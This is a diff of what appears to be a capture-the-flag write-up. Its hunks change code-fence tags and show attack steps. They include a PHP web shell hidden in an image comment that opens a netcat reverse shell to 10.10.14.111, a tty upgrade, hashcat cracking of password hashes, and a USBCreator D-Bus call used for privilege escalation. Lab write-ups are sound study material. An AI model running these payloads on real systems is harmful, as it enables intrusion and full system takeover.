@@ -63,7 +63,7 @@ After a bit of exploit code review, and vulnerability research ([CVE](https://ww
 
 Let's try to use `exiftool` to place some PHP code in an image, which uses system calls for code execution. We verify with `strings` that the payload has been inserted to the image.
 
-```
+```sh
 $ exiftool -Comment='<?php echo "<pre>"; system("rm -f /tmp/frosty; mknod /tmp/frosty p; /bin/sh 0</tmp/frosty | nc 10.10.14.111 1234 1>/tmp/frosty"); ?>' hack.png
 ```
 
@@ -83,7 +83,7 @@ And hopefully it should work! I got a shell!
 
 Let's quickly [upgrade the tty shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
-```
+```sh
 # In reverse shell
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
@@ -120,7 +120,7 @@ It seems that it is a JSON object.
 
 Alright, in here I think that we have a hash, but it looks pretty long. They are indeed SHA-256 so I suppose that they are pretty secure. Anyways, it's possible that these hashes have been cracked already, or we can try it ourselves quickly with rockyou.txt and hashcat
 
-```
+```sh
 hashcat -m 1400 hashdump /usr/share/wordlists/rockyou.txt
 ```
 
@@ -172,7 +172,7 @@ In fact, the next step too me a bit of hunting. I don't think that LinPeas.SH sh
 
 Let's try to perform some exploit!
 
-```
+```sh
 $ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/exploit/a.txt /a.txt true
 ```
 
